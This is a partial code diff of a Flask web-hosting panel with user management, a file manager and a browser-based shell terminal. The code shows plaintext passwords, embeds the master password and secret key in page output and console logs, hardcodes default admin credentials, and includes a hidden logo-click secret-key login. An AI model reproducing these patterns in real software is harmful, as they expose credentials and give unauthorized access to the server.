+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
+                        await loadBots();
+                        fileInputBot.value = '';
+                        fileCountDisplayBot.textContent = '';
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                } finally {
+                    deployBtnBot.textContent = 'DEPLOY BOT';
+                    deployBtnBot.disabled = false;
+                }
+            });
+
+            fileInputBot.addEventListener('change', function() {
+                const count = this.files.length;
+                if (count === 0) {
+                    fileCountDisplayBot.textContent = '';
+                } else {
+                    const names = Array.from(this.files).map(f => f.name).join(', ');
+                    fileCountDisplayBot.textContent = `${count} file(s) selected: ${names}`;
+                }
+            });
+
+            // ---------- ADMIN PANEL ----------
+            function openAdminPanel() {
+                if (!currentUser) {
+                    customAlert('Please login first.', '⚠️');
+                    return;
+                }
+                if (currentUser.role !== 'admin') {
+                    const username = currentUser.username;
+                    const password = '{{ user_password }}';
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <div style="font-size:20px; margin-bottom:20px;">👤 Your Profile</div>
+                            <div style="background:#161b25; padding:15px; border-radius:10px; margin-bottom:10px;">
+                                <strong style="color:#00e5ff;">Username</strong><br />
+                                <span style="font-size:18px; color:#fff;">${username}</span>
+                            </div>
+                            <div style="background:#161b25; padding:15px; border-radius:10px;">
+                                <strong style="color:#00e5ff;">Password</strong><br />
+                                <span style="font-size:18px; color:#fff;">${password}</span>
+                            </div>
+                        </div>
+                    `;
+                    showCustomModal('ℹ️', bodyHTML, [
+                        { label: 'OK', value: true, className: 'btn-ok' }
+                    ]);
+                    return;
+                }
+                loadAdminUsers();
+                adminOverlay.classList.add('open');
+            }
+
+            function closeAdminPanel() {
+                adminOverlay.classList.remove('open');
+            }
+
+            // ---------- USER MANAGEMENT (same as original) ----------
+            async function loadAdminUsers() {
+                try {
+                    const users = await apiCall('/api/users');
+                    renderFullUserList(users);
+                    renderSimpleLists(users);
+                } catch (e) {
+                    console.error('Failed to load users:', e);
+                }
+            }
+
+            function renderFullUserList(users) {
+                if (!users || users.length === 0) {
+                    fullUserListContainer.innerHTML = `<div class="empty-msg">No users found.</div>`;
+                    return;
+                }
+                let html = '';
+                users.forEach((u, idx) => {
+                    const bannedClass = u.banned ? 'banned' : (u.role === 'admin' ? 'admin' : 'user');
+                    const bannedText = u.banned ? 'UNBAN' : 'BAN';
+                    const roleLabel = u.role.toUpperCase();
+                    let expiryDisplay = 'Never';
+                    if (u.expires_at) {
+                        try {
+                            const exp = new Date(u.expires_at);
+                            expiryDisplay = exp.toLocaleString();
+                        } catch(e) { expiryDisplay = 'Invalid'; }
+                    }
+                    html += `
+                        <div class="list-item" data-username="${u.username}">
+                            <div class="row">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                    <span style="font-size:12px;color:#888;">Expires: ${expiryDisplay}</span>
+                                </div>
+                                <span class="badge-role ${bannedClass}">${u.banned ? 'BANNED' : roleLabel}</span>
+                            </div>
+                            <div class="row">
+                                <div class="limit-group">
+                                    <label>Limit:</label>
+                                    <input type="number" class="limit-input" value="${u.limit || 0}" min="0" step="1" />
+                                </div>
+                                <button class="btn-action btn-set" data-action="setLimit" data-username="${u.username}">SET</button>
+                                <button class="btn-action btn-ban" data-action="toggleBan" data-username="${u.username}">${bannedText}</button>
+                            </div>
+                            <div class="row">
+                                <input type="text" placeholder="New password..." style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newPass" />
+                                <button class="btn-action btn-reset" data-action="resetPass" data-username="${u.username}">RESET PW</button>
+                            </div>
+                            <div class="row">
+                                <input type="text" placeholder="New expiry (e.g. 5, 1m, 2h)" style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newExpiry" />
+                                <button class="btn-action btn-set" data-action="setExpiry" data-username="${u.username}">SET EXPIRY</button>
+                            </div>
+                            <button class="btn-action btn-del" data-action="deleteUser" data-username="${u.username}">DELETE USER + ALL BOTS</button>
+                        </div>
+                    `;
+                });
+                fullUserListContainer.innerHTML = html;
+                attachFullListEvents();
+            }
+
+            function attachFullListEvents() {
+                document.querySelectorAll('#fullUserListContainer [data-action]').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const action = this.dataset.action;
+                        const username = this.dataset.username;
+                        const card = this.closest('.list-item');
+                        if (action === 'setLimit') {
+                            const input = card.querySelector('.limit-input');
+                            const val = parseInt(input.value, 10);
+                            if (isNaN(val) || val < 0) {
+                                await customAlert('Enter a valid number.', '⚠️');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ limit: val })
+                                });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'toggleBan') {
+                            const user = (await apiCall('/api/users')).find(u => u.username === username);
+                            if (!user) return;
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ banned: !user.banned })
+                                });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'resetPass') {
+                            const passInput = card.querySelector('[data-field="newPass"]');
+                            const newPass = passInput.value.trim();
+                            if (!newPass) {
+                                await customAlert('Enter a new password.', '⚠️');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ password: newPass })
+                                });
+                                passInput.value = '';
+                                await customAlert('Password updated.', '✅');
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'setExpiry') {
+                            const expiryInput = card.querySelector('[data-field="newExpiry"]');
+                            const expiry = expiryInput.value.trim();
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ expiry: expiry })
+                                });
+                                expiryInput.value = '';
+                                await customAlert('Expiry updated.', '✅');
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'deleteUser') {
+                            const confirmed = await customConfirm(`Delete user ${username} and all their bots?`, '🗑️');
+                            if (!confirmed) return;
+                            if (username === currentUser.username) {
+                                await customAlert('Cannot delete yourself.', '🚫');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, { method: 'DELETE' });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        }
+                    });
+                });
+            }
+
+            function renderSimpleLists(users) {
+                const admins = users.filter(u => u.role === 'admin' && !u.banned);
+                const regulars = users.filter(u => u.role === 'user' && !u.banned);
+
+                if (!admins.length) {
+                    simpleAdminListContainer.innerHTML = `<div class="empty-msg">No admins.</div>`;
+                } else {
+                    let html = '';
+                    admins.forEach(u => {
+                        html += `
+                            <div class="simple-list-item" data-username="${u.username}">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                </div>
+                                <div class="actions">
+                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    simpleAdminListContainer.innerHTML = html;
+                }
+
+                if (!regulars.length) {
+                    simpleUserListContainer.innerHTML = `<div class="empty-msg">No users.</div>`;
+                } else {
+                    let html = '';
+                    regulars.forEach(u => {
+                        html += `
+                            <div class="simple-list-item" data-username="${u.username}">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                </div>
+                                <div class="actions">
+                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    simpleUserListContainer.innerHTML = html;
+                }
+
+                document.querySelectorAll('.btn-remove-simple').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const username = this.dataset.username;
+                        const confirmed = await customConfirm(`Remove user ${username}?`, '🗑️');
+                        if (!confirmed) return;
+                        if (username === currentUser.username) {
+                            await customAlert('Cannot remove yourself.', '🚫');
+                            return;
+                        }
+                        try {
+                            await apiCall(`/api/users/${username}`, { method: 'DELETE' });
+                            await loadAdminUsers();
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    });
+                });
+            }
+
+            // ---------- CREATE USER ----------
+            async function handleCreateUser() {
+                const username = newUsername.value.trim();
+                const password = newPassword.value.trim();
+                const expiry = newExpiry.value.trim();
+                const role = newRole.value;
+                if (!username || !password) {
+                    await customAlert('Username and Password required.', '⚠️');
+                    return;
+                }
+                try {
+                    await apiCall('/api/users', {
+                        method: 'POST',
+                        body: JSON.stringify({ username, password, role, expiry })
+                    });
+                    await loadAdminUsers();
+                    newUsername.value = '';
+                    newPassword.value = '';
+                    newExpiry.value = '';
+                    createUserForm.style.display = 'none';
+                    await customAlert(`User ${username} created.`, '✅');
+                } catch (e) {
+                    await customAlert(e.message || 'Creation failed', '❌');
+                }
+            }
+
+            // ---------- FILE MANAGER (same as original) ----------
+            const fileManagerList = document.getElementById('fileManagerList');
+            const fileBreadcrumb = document.getElementById('fileBreadcrumb');
+            const contextMenu = document.getElementById('fileContextMenu');
+            const ctxDelete = document.getElementById('ctxDelete');
+            const ctxRename = document.getElementById('ctxRename');
+            const ctxDownload = document.getElementById('ctxDownload');
+
+            let currentPath = '';
+            let selectedFilePath = null;
+
+            async function loadDirectory(path = '') {
+                currentPath = path;
+                try {
+                    const res = await fetch(`/api/files?path=${encodeURIComponent(path)}`);
+                    if (!res.ok) {
+                        const err = await res.json();
+                        await customAlert(err.error || 'Failed to load', '❌');
+                        return;
+                    }
+                    const data = await res.json();
+                    renderFileList(data);
+                } catch (e) {
+                    await customAlert('Error: ' + e.message, '❌');
+                }
+            }
+
+            function renderFileList(data) {
+                const items = data.items || [];
+                let breadHtml = '';
+                const parts = currentPath.split('/').filter(p => p);
+                let cum = '';
+                breadHtml += `<span onclick="window._loadDirectory('')">📁 root</span>`;
+                parts.forEach((p, idx) => {
+                    cum += (cum ? '/' : '') + p;
+                    breadHtml += `<span class="sep">/</span><span onclick="window._loadDirectory('${cum}')">${escapeHtml(p)}</span>`;
+                });
+                fileBreadcrumb.innerHTML = breadHtml;
+
+                let html = '';
+                if (currentPath) {
+                    html += `<div class="file-item" onclick="window._loadDirectory('${currentPath.split('/').slice(0, -1).join('/')}')">
+                        <span class="name"><i class="fa-solid fa-arrow-up"></i> ..</span>
+                    </div>`;
+                }
+                items.forEach(item => {
+                    const icon = item.type === 'directory' ? '<i class="fa-solid fa-folder dir-icon"></i>' : '<i class="fa-solid fa-file"></i>';
+                    const sizeText = item.type === 'file' ? (item.size / 1024).toFixed(1) + ' KB' : '';
+                    html += `
+                        <div class="file-item" data-path="${item.path}" data-type="${item.type}">
+                            <span class="name">${icon} ${escapeHtml(item.name)}</span>
+                            <span class="size">${sizeText}</span>
+                        </div>
+                    `;
+                });
+                fileManagerList.innerHTML = html;
+
+                document.querySelectorAll('.file-item').forEach(el => {
+                    el.addEventListener('click', function(e) {
+                        const path = this.dataset.path;
+                        const type = this.dataset.type;
+                        if (type === 'directory') {
+                            window._loadDirectory(path);
+                        } else {
+                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                            this.classList.add('selected');
+                            selectedFilePath = path;
+                        }
+                    });
+
+                    let timer;
+                    el.addEventListener('touchstart', function(e) {
+                        timer = setTimeout(() => {
+                            e.preventDefault();
+                            const path = this.dataset.path;
+                            showContextMenu(e.touches[0].clientX, e.touches[0].clientY, path);
+                            document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                            this.classList.add('selected');
+                            selectedFilePath = path;
+                        }, 3000);
+                    });
+                    el.addEventListener('touchend', function() { clearTimeout(timer); });
+                    el.addEventListener('touchmove', function() { clearTimeout(timer); });
+
+                    el.addEventListener('contextmenu', function(e) {
+                        e.preventDefault();
+                        const path = this.dataset.path;
+                        showContextMenu(e.clientX, e.clientY, path);
+                        document.querySelectorAll('.file-item').forEach(f => f.classList.remove('selected'));
+                        this.classList.add('selected');
+                        selectedFilePath = path;
+                    });
+                });
+            }
+
+            function showContextMenu(x, y, path) {
+                contextMenu.style.display = 'block';
+                contextMenu.style.left = x + 'px';
+                contextMenu.style.top = y + 'px';
+                contextMenu.dataset.path = path;
+            }
+
+            function hideContextMenu() {
+                contextMenu.style.display = 'none';
+            }
+
+            ctxDelete.addEventListener('click', async function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                const confirmed = await customConfirm(`Delete ${path}?`, '🗑️');
+                if (!confirmed) return;
+                try {
+                    const res = await fetch('/api/files/delete', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ path })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Deleted.', '✅');
+                        loadDirectory(currentPath);
+                    } else {
+                        await customAlert(data.error || 'Delete failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            });
+
+            ctxRename.addEventListener('click', async function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                const newName = await customPrompt('Enter new name:', path.split('/').pop());
+                if (newName === null) return;
+                if (!newName.trim()) {
+                    await customAlert('Name cannot be empty.', '⚠️');
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/files/rename', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ old_path: path, new_name: newName.trim() })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Renamed.', '✅');
+                        loadDirectory(currentPath);
+                    } else {
+                        await customAlert(data.error || 'Rename failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            });
+
+            ctxDownload.addEventListener('click', function() {
+                const path = contextMenu.dataset.path || selectedFilePath;
+                if (!path) return;
+                hideContextMenu();
+                window.open(`/api/files/download?path=${encodeURIComponent(path)}`, '_blank');
+            });
+
+            function customPrompt(message, defaultValue) {
+                return new Promise((resolve) => {
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <p style="margin-bottom:12px;">${message}</p>
+                            <input type="text" id="promptInput" value="${escapeHtml(defaultValue || '')}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                        </div>
+                    `;
+                    showCustomModal('✏️', bodyHTML, [
+                        { label: 'Cancel', value: null, className: 'btn-cancel' },
+                        { label: 'OK', value: true, className: 'btn-confirm' }
+                    ]).then((result) => {
+                        if (result === null) resolve(null);
+                        else {
+                            const val = document.getElementById('promptInput')?.value;
+                            resolve(val);
+                        }
+                    });
+                });
+            }
+
+            window._loadDirectory = function(path) {
+                hideContextMenu();
+                loadDirectory(path);
+            };
+
+            document.addEventListener('click', function(e) {
+                if (!contextMenu.contains(e.target)) {
+                    hideContextMenu();
+                }
+            });
+
+            // ---------- ADMIN TAB SWITCHING ----------
+            const adminTabBtns = document.querySelectorAll('.admin-tabs button');
+            const adminTabContents = {
+                tabAdminMenu: document.getElementById('tabAdminMenu'),
+                tabUserMenu: document.getElementById('tabUserMenu'),
+                tabTerminal: document.getElementById('tabTerminal'),
+                tabFileManager: document.getElementById('tabFileManager'),
+                tabStats: document.getElementById('tabStats')
+            };
+
+            adminTabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.dataset.tab;
+                    adminTabBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    Object.keys(adminTabContents).forEach(key => {
+                        if (adminTabContents[key]) {
+                            adminTabContents[key].classList.toggle('active', key === tabId);
+                        }
+                    });
+                    if (tabId === 'tabTerminal') {
+                        setTimeout(() => terminalCommand.focus(), 100);
+                        if (!terminalPollInterval) {
+                            startTerminalPolling();
+                        }
+                    }
+                    if (tabId === 'tabFileManager') {
+                        loadDirectory('');
+                    }
+                    if (tabId === 'tabStats') {
+                        fetchStats();
+                        if (window.statsInterval) clearInterval(window.statsInterval);
+                        window.statsInterval = setInterval(fetchStats, 5000);
+                    } else {
+                        if (window.statsInterval) {
+                            clearInterval(window.statsInterval);
+                            window.statsInterval = null;
+                        }
+                    }
+                });
+            });
+
+            // ---------- TERMINAL (INTERACTIVE) ----------
+            async function startTerminalPolling() {
+                if (terminalPollInterval) clearInterval(terminalPollInterval);
+                try {
+                    await fetch('/api/terminal/start', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password: '{{ password }}' })
+                    });
+                } catch (e) {
+                    console.error('Failed to start terminal:', e);
+                }
+                terminalPollInterval = setInterval(async () => {
+                    try {
+                        const res = await fetch('/api/terminal/read');
+                        const data = await res.json();
+                        if (data.output) {
+                            terminalOutput.innerHTML += `<span class="output">${escapeHtml(data.output)}</span>`;
+                            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                        }
+                        isTerminalRunning = data.running;
+                        termStopBtn.disabled = !isTerminalRunning;
+                    } catch (e) {
+                        // ignore
+                    }
+                }, 500);
+            }
+
+            async function sendTerminalData(data) {
+                try {
+                    await fetch('/api/terminal/send', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ data: data, password: '{{ password }}' })
+                    });
+                } catch (e) {
+                    console.error('Failed to send terminal input:', e);
+                }
+            }
+
+            async function stopTerminal() {
+                try {
+                    await fetch('/api/terminal/stop', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ password: '{{ password }}' })
+                    });
+                    terminalOutput.innerHTML += `<span class="prompt">[Terminal stopped]</span><br />`;
+                    isTerminalRunning = false;
+                    termStopBtn.disabled = true;
+                    setTimeout(() => {
+                        startTerminalPolling();
+                    }, 500);
+                } catch (e) {
+                    console.error('Failed to stop terminal:', e);
+                }
+            }
+
+            function clearTerminal() {
+                terminalOutput.innerHTML = '<span class="prompt">$ </span>Terminal cleared.<br />';
+            }
+
+            termRunBtn.addEventListener('click', function() {
+                const data = terminalCommand.value;
+                if (!data) return;
+                if (!isTerminalRunning) {
+                    // try to start
+                }
+                sendTerminalData(data);
+                terminalCommand.value = '';
+            });
+
+            termStopBtn.addEventListener('click', stopTerminal);
+            termClearBtn.addEventListener('click', clearTerminal);
+
+            terminalCommand.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    termRunBtn.click();
+                }
+            });
+
+            // ---------- STATS ----------
+            async function fetchStats() {
+                try {
+                    const res = await fetch('/api/stats');
+                    if (!res.ok) return;
+                    const data = await res.json();
+                    document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
+                    document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
+                    document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
+                    document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
+                    document.getElementById('statRenderActive').textContent = data.render_active_count;
+                    document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
+                    document.getElementById('statDiskFree').textContent = data.disk_free_gb;
+                    document.getElementById('statRam').textContent = data.ram.percent + '%';
+                    document.getElementById('statRamUsed').textContent = data.ram.used_mb;
+                    document.getElementById('statRamTotal').textContent = data.ram.total_mb;
+                    document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
+                    document.getElementById('statCpu').textContent = data.cpu_percent + '%';
+                } catch (e) {
+                    console.error('Stats error:', e);
+                }
+            }
+
+            document.getElementById('setOffsetBtn')?.addEventListener('click', async function() {
+                const val = parseFloat(document.getElementById('offsetInput').value);
+                if (isNaN(val)) {
+                    await customAlert('Enter valid number', '⚠️');
+                    return;
+                }
+                try {
+                    const res = await fetch('/api/set_offset', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ offset: val })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Offset set to ' + val + ' hrs', '✅');
+                        fetchStats();
+                    } else {
+                        await customAlert(data.error || 'Failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            });
+
+            // ---------- EVENT BINDINGS ----------
+            loginBtn.addEventListener('click', handleLogin);
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && loginView.classList.contains('active')) {
+                    handleLogin();
+                }
+            });
+
+            hamburgerBtn.addEventListener('click', openAdminPanel);
+            adminCloseBtn.addEventListener('click', closeAdminPanel);
+            adminOverlay.addEventListener('click', function(e) {
+                if (e.target === this) closeAdminPanel();
+            });
+
+            logoutBtn.addEventListener('click', handleLogout);
+
+            toggleCreateUserBtn.addEventListener('click', function() {
+                const form = document.getElementById('createUserForm');
+                form.style.display = form.style.display === 'none' ? 'block' : 'none';
+            });
+
+            createUserBtn.addEventListener('click', handleCreateUser);
+
+            // ---------- INIT ----------
+            const loggedIn = {{ logged_in|tojson }};
+            if (loggedIn) {
+                currentUser = {
+                    username: '{{ username }}',
+                    role: '{{ session.get("role", "") }}'
+                };
+                // Load websites and bots
+                loadWebsites();
+                loadBots();
+                if (currentUser.role === 'admin') {
+                    loadAdminUsers();
+                }
+            }
+
+            function escapeHtml(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            function formatUptime(seconds) {
+                if (seconds < 0) return '--';
+                const d = Math.floor(seconds / 86400);
+                const h = Math.floor((seconds % 86400) / 3600);
+                const m = Math.floor((seconds % 3600) / 60);
+                const s = Math.floor(seconds % 60);
+                return `${d}d ${h}h ${m}m ${s}s`;
+            }
+
+            console.log('🔐 YUVICODEX System ready (Websites + Bots).');
+            console.log('📋 Default accounts: admin/admin123 (admin), user1/pass123, user2/pass456');
+            console.log('💻 Use upload to deploy websites or bots.');
+            console.log('🔑 Master Password: {{ MASTER_PASSWORD if MASTER_PASSWORD else "not set" }}');
+            console.log('🔐 Secret Key: {{ SECRET_KEY if SECRET_KEY else "not set" }}');
+            console.log('👉 Click logo 5 times for secret key login.');
+            console.log('📡 Interactive terminal started.');
+
+            // Add a route to fetch websites list (for JS)
+            // We'll add a new endpoint /api/websites
+        })();
+    </script>
+</body>
+</html>
 """
+
+# ---------- ADD MISSING ROUTE FOR /api/websites ----------
+@app.route('/api/websites')
+@login_required
+def api_list_websites():
+    username = session['username']
+    with get_db() as conn:
+        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
+    return jsonify([dict(row) for row in websites])
+
+# ---------- BUILD LOGS PAGE (for websites) ----------
+@app.route('/website/<int:website_id>/build')
+@login_required
+def build_logs_page(website_id):
+    w = get_website_by_id(website_id)
+    if not w or w['owner_username'] != session['username']:
+        abort(404)
+    with get_db() as conn:
+        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
+    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)
 
 BUILD_LOGS_TEMPLATE = """
 <!DOCTYPE html>
@@ -2185,24 +5483,19 @@ evt.onmessage = function(e) {
 </script></body></html>
 """
 
-DEPLOYMENTS_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Deployments</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}table{width:100%;border-collapse:collapse}th,td{padding:10px;border-bottom:1px solid rgba(255,255,255,0.05)}</style>
-</head><body><div class="container"><a href="/dashboard">← Dashboard</a><h2>Deployments</h2>
-<table><tr><th>#</th><th>Repo</th><th>Status</th><th>Started</th></tr>{% for d in deployments %}<tr><td>{{ d.id }}</td><td>{{ d.repo_url or 'ZIP' }}</td><td>{{ d.status }}</td><td>{{ d.started_at }}</td></tr>{% endfor %}</table></div></body></html>
-"""
-
 # ---------- MAIN START ----------
+LOG_FOLDER = os.path.join(BASE_DIR, 'logs')
+os.makedirs(LOG_FOLDER, exist_ok=True)
+
 MAIN_START_TIME = int(time.time())
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     print("="*60)
-    print("🚀 YUVICODEX ULTIMATE HOST (Websites + Bots + Stats)")
+    print("🚀 YUVICODEX ULTIMATE (Websites + Bots + Stats)")
     print(f"🌐 Port: {port}")
     print("👤 Admin: admin / admin123")
     print("📊 Stats: Owner only. Set Offset from Render Dashboard.")
-    print("📁 Upload folders: websites and bots both supported.")
+    print("🌍 Websites at /<slug>/")
     print("="*60)
     app.run(host='0.0.0.0', port=port, debug=False)
